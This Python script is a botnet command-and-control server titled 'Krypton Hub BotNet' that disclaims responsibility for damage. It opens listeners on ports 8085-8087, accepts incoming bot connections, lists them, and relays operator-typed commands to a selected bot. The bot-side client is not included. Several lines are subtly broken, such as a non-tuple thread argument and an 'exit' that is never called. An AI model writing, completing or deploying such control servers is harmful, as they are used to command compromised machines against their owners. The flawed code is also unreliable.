import socket
from threading import Thread
import time
from time import sleep
import os
import platform
from turtle import clear

sysOS = platform.system()

logo = """ 
     _   __                 _                _   _       _     
    | | / /                | |              | | | |     | |    
    | |/ / _ __ _   _ _ __ | |_ ___  _ __   | |_| |_   _| |__  
    |    \| '__| | | | '_ \| __/ _ \| '_ \  |  _  | | | | '_ \ 
    | |\  \ |  | |_| | |_) | || (_) | | | | | | | | |_| | |_) |
    \_| \_/_|   \__, | .__/ \__\___/|_| |_| \_| |_/\__,_|_.__/ 
                 __/ | |                                       
                |___/|_|                                       

                         [-] BotNet [-]
                 [X] Use It On Your Own Risk [X]
        [X] Im Not Responsible For Any Damage You Make [X]

"""

threads = []
clients = []

def main():
    clear_screen()
    print(logo)
    print("-------------------------------------------")
    print("| Show IP address (0)")
    print("-------------------------------------------")
    print("| Start BotNet Server (1)")
    print("-------------------------------------------")
    print("| Exit (99)")
    print("-------------------------------------------")
    inputs()

def inputs():

    cmd = input("\nCommand: ")

    if cmd != "":
        if cmd == "0":
            clear_screen()
            os.system("ifconfig")
            input("\n\nPress ENTER to continue:")
            main()

        if cmd == "1":
            core()

        if cmd == "99":
            print("\nExiting...")
            sleep(2)
            clear_screen()
            exit
    else:
        print("\n[!] Wrong Command..")
        sleep(1)
        main()

def listen_for_bots(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", port))
    sock.listen()
    bot, bot_address = sock.accept()
    clients.append(bot)

def core():

    clear_screen()
    print(logo)
    print("[+] Server bot waiting for incomeing connections")

    starting_port = 8085

    bots = 3

    for i in range(bots):
        t = Thread(target=listen_for_bots, args=(i + starting_port), daemon=True)
        threads.append(t)
        t.start()

    run_cnc = True
    while run_cnc:
        if len(clients) != 0:
            for i, c in enumerate(clients):
                print("\t\t", i, "\t", c.getpeername())

            selected_client = int(input("[+] Select client by index: "))
            bot = clients[selected_client]
            run_bot = True
            while run_bot:
                msg = input("[+] Enter Message: ")
                msg = msg.encode()
                bot.send(msg)
                if msg.decode() == "exit":
                    run_bot = False
            status = bot.recv(1024)
            if status == "disconnected".encode():
                bot.close()
                clients.remove(bot)
            
            
            print("data sent")
        else:
            print("\n[+] No clients connected")
            ans = input("\n[+] Do you want to exit? (y/n): ")
            if ans == "y":
                run_cnc = False
                main()
            else:
                run_cnc = True

def clear_screen():
    if sysOS == "Linux":
        os.system("clear")
    if sysOS == "Windows":
        os.system("cls")

def diagnostic():
    clear_screen()
    print(logo)

    print("Detecting System...")
    sleep(1)

    if sysOS == "Linux":
        main()
    else:
        print("\nYou have to run this program on Linux, you currently trying to run it on: ", sysOS)
        print("\nExiting...")
        sleep(1)
        exit

diagnostic()